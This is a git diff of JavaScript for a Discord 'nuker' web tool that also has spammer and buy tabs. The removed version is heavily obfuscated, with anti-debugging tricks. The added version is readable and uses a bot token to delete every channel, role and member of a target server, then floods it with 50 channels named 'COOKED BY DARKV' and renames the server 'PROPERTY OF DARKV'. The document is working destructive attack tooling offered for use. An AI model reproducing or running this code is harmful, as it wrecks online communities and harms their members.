@@ -1,1 +1,158 @@
-const _0x46230e=_0x2fd8;(function(_0x28d761,_0x342b98){const _0x5cf1fe=_0x2fd8,_0x1fcff1=_0x28d761();while(!![]){try{const _0x456c41=-parseInt(_0x5cf1fe(0x1c9))/0x1+-parseInt(_0x5cf1fe(0x1ff))/0x2*(-parseInt(_0x5cf1fe(0x1ef))/0x3)+-parseInt(_0x5cf1fe(0x1bc))/0x4*(-parseInt(_0x5cf1fe(0x1de))/0x5)+-parseInt(_0x5cf1fe(0x201))/0x6+parseInt(_0x5cf1fe(0x1ec))/0x7+-parseInt(_0x5cf1fe(0x1ee))/0x8+-parseInt(_0x5cf1fe(0x1c1))/0x9;if(_0x456c41===_0x342b98)break;else _0x1fcff1['push'](_0x1fcff1['shift']());}catch(_0x255e58){_0x1fcff1['push'](_0x1fcff1['shift']());}}}(_0x5a44,0x1999d));const _0x9ff846=(function(){let _0x4e0826=!![];return function(_0x45f493,_0x9802d0){const _0x569baa=_0x4e0826?function(){const _0x693e81=_0x2fd8;if(_0x9802d0){const _0x4c21c0=_0x9802d0[_0x693e81(0x1e2)](_0x45f493,arguments);return _0x9802d0=null,_0x4c21c0;}}:function(){};return _0x4e0826=![],_0x569baa;};}()),_0x124a86=_0x9ff846(this,function(){const _0x20458f=_0x2fd8;return _0x124a86['toString']()['search'](_0x20458f(0x1d1))[_0x20458f(0x1e7)]()[_0x20458f(0x1e4)](_0x124a86)[_0x20458f(0x1cd)](_0x20458f(0x1d1));});_0x124a86();const _0x417a6b=(function(){let _0x2db2b8=!![];return function(_0xec0374,_0x2a3ff5){const _0x88ea79=_0x2db2b8?function(){const _0x17b33b=_0x2fd8;if(_0x2a3ff5){const _0x5d4777=_0x2a3ff5[_0x17b33b(0x1e2)](_0xec0374,arguments);return _0x2a3ff5=null,_0x5d4777;}}:function(){};return _0x2db2b8=![],_0x88ea79;};}());(function(){_0x417a6b(this,function(){const _0x1e0631=_0x2fd8,_0x87d3f5=new RegExp(_0x1e0631(0x1fe)),_0x12deca=new RegExp(_0x1e0631(0x1d9),'i'),_0x1f3eb2=_0x47ad14(_0x1e0631(0x1cb));!_0x87d3f5['test'](_0x1f3eb2+_0x1e0631(0x1d0))||!_0x12deca[_0x1e0631(0x1f4)](_0x1f3eb2+'input')?_0x1f3eb2('0'):_0x47ad14();})();}());const _0x29408a=(function(){let _0xaf8258=!![];return function(_0x17a468,_0x3d267d){const _0x28d423=_0xaf8258?function(){if(_0x3d267d){const _0x1d5466=_0x3d267d['apply'](_0x17a468,arguments);return _0x3d267d=null,_0x1d5466;}}:function(){};return _0xaf8258=![],_0x28d423;};}()),_0x2290d7=_0x29408a(this,function(){const _0x51d667=_0x2fd8;let _0x5afebe;try{const _0x249b58=Function('return\x20(function()\x20'+_0x51d667(0x1da)+');');_0x5afebe=_0x249b58();}catch(_0x5c6d5c){_0x5afebe=window;}const _0x269e0d=_0x5afebe['console']=_0x5afebe[_0x51d667(0x1ca)]||{},_0x3455f5=[_0x51d667(0x1cf),_0x51d667(0x1bd),_0x51d667(0x1c2),_0x51d667(0x1d8),_0x51d667(0x1e6),_0x51d667(0x1fa),_0x51d667(0x1d5)];for(let _0x740444=0x0;_0x740444<_0x3455f5[_0x51d667(0x1fb)];_0x740444++){const _0x1d334e=_0x29408a[_0x51d667(0x1e4)][_0x51d667(0x1fd)][_0x51d667(0x1f7)](_0x29408a),_0x29950a=_0x3455f5[_0x740444],_0x20ea89=_0x269e0d[_0x29950a]||_0x1d334e;_0x1d334e[_0x51d667(0x1d3)]=_0x29408a[_0x51d667(0x1f7)](_0x29408a),_0x1d334e['toString']=_0x20ea89[_0x51d667(0x1e7)][_0x51d667(0x1f7)](_0x20ea89),_0x269e0d[_0x29950a]=_0x1d334e;}});_0x2290d7();const nukeButton=document[_0x46230e(0x1e8)](_0x46230e(0x1be)),nukerStatus=document[_0x46230e(0x1e8)](_0x46230e(0x1d2)),nukerLoader=document['getElementById'](_0x46230e(0x1eb)),botTokenInput=document[_0x46230e(0x1e8)](_0x46230e(0x1ba)),serverIdInput=document[_0x46230e(0x1e8)](_0x46230e(0x1dd));function _0x5a44(){const _0x1cf630=['gger','bind','Failed\x20to\x20fetch\x20bot\x20or\x20server\x20info','value','table','length','style','prototype','function\x20*\x5c(\x20*\x5c)','838bwTCKC','https://discord.com/api/v9/channels/','1161030rqjkfP','while\x20(true)\x20{}','botToken','Status:\x20Error...\x20Invalid\x20Bot\x20Token\x20or\x20Server\x20ID','548QXfwKI','warn','nukeButton','debu','https://discord.com/api/v9/guilds/','39483MhqdoV','info','addEventListener','trim','DELETE','Bot\x20','@everyone','https://your-image-url-here.png','21884JsryKm','console','init','block','search','Status:\x20Nuking\x20completed\x20successfully!','log','chain','(((.+)+)+)+$','nukerStatus','__proto__','/members','trace','PATCH','textContent','error','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','{}.constructor(\x22return\x20this\x22)(\x20)','/channels','none','serverId','6905AiYTiV','serverName','string','name','apply','stringify','constructor','click','exception','toString','getElementById','action','/members/','nukerLoader','1399818pNqgTO','json','1639192HYRjPU','1005IDhcUc','Status:\x20Error\x20occurred\x20during\x20nuking!','application/json','stateObject','display','test','/roles/'];_0x5a44=function(){return _0x1cf630;};return _0x5a44();}nukeButton[_0x46230e(0x1c3)](_0x46230e(0x1e5),async()=>{const _0xd48575=_0x46230e,_0x2a6b4f=botTokenInput[_0xd48575(0x1f9)][_0xd48575(0x1c4)](),_0xcbcbb4=serverIdInput['value'][_0xd48575(0x1c4)]();if(!_0x2a6b4f||!_0xcbcbb4){nukerStatus[_0xd48575(0x1d7)]=_0xd48575(0x1bb);return;}nukerStatus[_0xd48575(0x1d7)]='Status:\x20Fetching\x20Bot\x20Info...',nukerLoader[_0xd48575(0x1fc)]['display']=_0xd48575(0x1cc);try{const _0x12eead=await fetchBotInfo(_0x2a6b4f,_0xcbcbb4);nukerStatus['textContent']='Status:\x20Nuking\x20Server:\x20'+_0x12eead[_0xd48575(0x1df)],await performNuking(_0x2a6b4f,_0xcbcbb4),nukerStatus[_0xd48575(0x1d7)]=_0xd48575(0x1ce);}catch(_0x3c8267){console[_0xd48575(0x1d8)](_0x3c8267),nukerStatus[_0xd48575(0x1d7)]=_0xd48575(0x1f0);}finally{nukerLoader[_0xd48575(0x1fc)][_0xd48575(0x1f3)]=_0xd48575(0x1dc);}});function _0x2fd8(_0x1ce7ed,_0x35d031){const _0x310364=_0x5a44();return _0x2fd8=function(_0x2290d7,_0x29408a){_0x2290d7=_0x2290d7-0x1ba;let _0x1613c8=_0x310364[_0x2290d7];return _0x1613c8;},_0x2fd8(_0x1ce7ed,_0x35d031);}async function fetchBotInfo(_0x36c93b,_0x4317a3){const _0x55dae9=_0x46230e,_0x1c3f42=await fetch(_0x55dae9(0x1c0)+_0x4317a3,{'headers':{'Authorization':_0x55dae9(0x1c6)+_0x36c93b}});if(!_0x1c3f42['ok'])throw new Error(_0x55dae9(0x1f8));const _0x14aeb9=await _0x1c3f42[_0x55dae9(0x1ed)]();return{'botName':_0x14aeb9[_0x55dae9(0x1e1)],'serverName':_0x14aeb9[_0x55dae9(0x1e1)]};}async function performNuking(_0x2515a6,_0x2382e4){const _0x13c164=_0x46230e,_0x11d1f7={'Authorization':_0x13c164(0x1c6)+_0x2515a6,'Content-Type':_0x13c164(0x1f1)},_0x42bf3d=await fetch(_0x13c164(0x1c0)+_0x2382e4+_0x13c164(0x1db),{'headers':_0x11d1f7}),_0x3fdec6=await _0x42bf3d[_0x13c164(0x1ed)]();for(const _0x33d7fa of _0x3fdec6){await fetch(_0x13c164(0x200)+_0x33d7fa['id'],{'method':_0x13c164(0x1c5),'headers':_0x11d1f7});}const _0x529b43=await fetch(_0x13c164(0x1c0)+_0x2382e4+'/roles',{'headers':_0x11d1f7}),_0x243ff4=await _0x529b43['json']();for(const _0x91ffb0 of _0x243ff4){_0x91ffb0[_0x13c164(0x1e1)]!==_0x13c164(0x1c7)&&await fetch(_0x13c164(0x1c0)+_0x2382e4+_0x13c164(0x1f5)+_0x91ffb0['id'],{'method':_0x13c164(0x1c5),'headers':_0x11d1f7});}const _0xaf8e01=await fetch(_0x13c164(0x1c0)+_0x2382e4+_0x13c164(0x1d4),{'headers':_0x11d1f7}),_0x1bf9d5=await _0xaf8e01[_0x13c164(0x1ed)]();for(const _0x249442 of _0x1bf9d5){_0x249442['user']['id']!==_0x2515a6&&await fetch(_0x13c164(0x1c0)+_0x2382e4+_0x13c164(0x1ea)+_0x249442['user']['id'],{'method':_0x13c164(0x1c5),'headers':_0x11d1f7});}await fetch(_0x13c164(0x1c0)+_0x2382e4,{'method':_0x13c164(0x1d6),'headers':_0x11d1f7,'body':JSON[_0x13c164(0x1e3)]({'name':'PROPERTY\x20OF\x20DARKV','icon':_0x13c164(0x1c8)})});}function _0x47ad14(_0x149561){function _0xb42c49(_0xb51a68){const _0x4acfe2=_0x2fd8;if(typeof _0xb51a68===_0x4acfe2(0x1e0))return function(_0x1acd3a){}[_0x4acfe2(0x1e4)](_0x4acfe2(0x202))[_0x4acfe2(0x1e2)]('counter');else(''+_0xb51a68/_0xb51a68)[_0x4acfe2(0x1fb)]!==0x1||_0xb51a68%0x14===0x0?function(){return!![];}[_0x4acfe2(0x1e4)](_0x4acfe2(0x1bf)+_0x4acfe2(0x1f6))['call'](_0x4acfe2(0x1e9)):function(){return![];}[_0x4acfe2(0x1e4)]('debu'+_0x4acfe2(0x1f6))['apply'](_0x4acfe2(0x1f2));_0xb42c49(++_0xb51a68);}try{if(_0x149561)return _0xb42c49;else _0xb42c49(0x0);}catch(_0x2e1930){}}
+// Handle Tab Navigation
+window.addEventListener('load', () => {
+    document.getElementById("homeTab").addEventListener("click", () => toggleTab("home"));
+    document.getElementById("spammerTab").addEventListener("click", () => toggleTab("spammer"));
+    document.getElementById("infoTab").addEventListener("click", () => toggleTab("info"));
+    document.getElementById("buyTab").addEventListener("click", () => toggleTab("buy"));
+    document.getElementById("nukerTab").addEventListener("click", () => toggleTab("nuker"));
+});
+
+function toggleTab(tabId) {
+    document.querySelectorAll('.container').forEach(container => {
+        container.style.display = "none";
+    });
+    document.getElementById(`${tabId}Content`).style.display = 'block';
+}
+
+// Nuker Tab JavaScript
+const nukeButton = document.getElementById('nukeButton');
+const nukerStatus = document.getElementById('nukerStatus');
+const nukerLoader = document.getElementById('nukerLoader');
+const botTokenInput = document.getElementById('botToken');
+const serverIdInput = document.getElementById('serverId');
+const botNameElement = document.getElementById('botName');
+const serverNameElement = document.getElementById('serverName');
+
+nukeButton.addEventListener("click", async () => {
+    const botToken = botTokenInput.value.trim();
+    const serverId = serverIdInput.value.trim();
+
+    if (!botToken || !serverId) {
+        nukerStatus.textContent = "Status: Error... Invalid Bot Token or Server ID";
+        return;
+    }
+
+    nukerStatus.textContent = "Status: Fetching Bot Info...";
+    nukerLoader.style.display = "block";
+
+    try {
+        // Fetch bot user info and server info
+        const botInfo = await fetchBotInfo(botToken, serverId);
+        botNameElement.textContent = `Bot Name: ${botInfo.botName}`;
+        serverNameElement.textContent = `Server Name: ${botInfo.serverName}`;
+        
+        // Start nuking process
+        await performNuking(botToken, serverId);
+
+        nukerStatus.textContent = "Status: Nuking completed successfully!";
+    } catch (error) {
+        console.error(error);
+        nukerStatus.textContent = "Status: Error occurred during nuking!";
+    } finally {
+        nukerLoader.style.display = "none";
+    }
+});
+
+async function fetchBotInfo(botToken, serverId) {
+    const response = await fetch(`https://discord.com/api/v9/guilds/${serverId}`, {
+        headers: {
+            'Authorization': `Bot ${botToken}`
+        }
+    });
+
+    if (!response.ok) throw new Error("Failed to fetch bot or server info");
+
+    const data = await response.json();
+    const botName = data.name;
+    const serverName = data.name;
+
+    return { botName, serverName };
+}
+
+async function performNuking(botToken, serverId) {
+    const headers = {
+        'Authorization': `Bot ${botToken}`,
+        'Content-Type': 'application/json'
+    };
+
+    // Deleting channels
+    const channels = await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
+        method: 'GET',
+        headers: headers
+    });
+
+    const channelData = await channels.json();
+    for (let channel of channelData) {
+        await fetch(`https://discord.com/api/v9/channels/${channel.id}`, {
+            method: 'DELETE',
+            headers: headers
+        });
+    }
+
+    // Deleting roles
+    const roles = await fetch(`https://discord.com/api/v9/guilds/${serverId}/roles`, {
+        method: 'GET',
+        headers: headers
+    });
+
+    const roleData = await roles.json();
+    for (let role of roleData) {
+        if (role.name !== '@everyone') {
+            await fetch(`https://discord.com/api/v9/guilds/${serverId}/roles/${role.id}`, {
+                method: 'DELETE',
+                headers: headers
+            });
+        }
+    }
+
+    // Deleting members
+    const members = await fetch(`https://discord.com/api/v9/guilds/${serverId}/members`, {
+        method: 'GET',
+        headers: headers
+    });
+
+    const memberData = await members.json();
+    for (let member of memberData) {
+        if (member.user.id !== botToken) {
+            await fetch(`https://discord.com/api/v9/guilds/${serverId}/members/${member.user.id}`, {
+                method: 'DELETE',
+                headers: headers
+            });
+        }
+    }
+
+    // Create new channels
+    const newChannelData = {
+        'name': 'COOKED BY DARKV 😈',
+        'type': 0, // Text channel
+        'guild_id': serverId
+    };
+
+    for (let i = 0; i < 50; i++) {
+        await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify(newChannelData)
+        });
+    }
+
+    // Update Server Name and Bot Profile Picture
+    await fetch(`https://discord.com/api/v9/guilds/${serverId}`, {
+        method: 'PATCH',
+        headers: headers,
+        body: JSON.stringify({
+            'name': 'PROPERTY OF DARKV',
+            'icon': 'https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png?ex=676a1afc&is=6768c97c&hm=8586677d875c772f95983ff3426ae0f732a0a402fc037263566aaef14633eb33&'
+        })
+    });
+
+    // Change bot username and profile picture
+    await fetch(`https://discord.com/api/v9/users/@me`, {
+        method: 'PATCH',
+        headers: headers,
+        body: JSON.stringify({
+            'username': 'DarkV',
+            'avatar': 'https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png?ex=676a1afc&is=6768c97c&hm=8586677d875c772f95983ff3426ae0f732a0a402fc037263566aaef14633eb33&'
+        })
+    });
+}
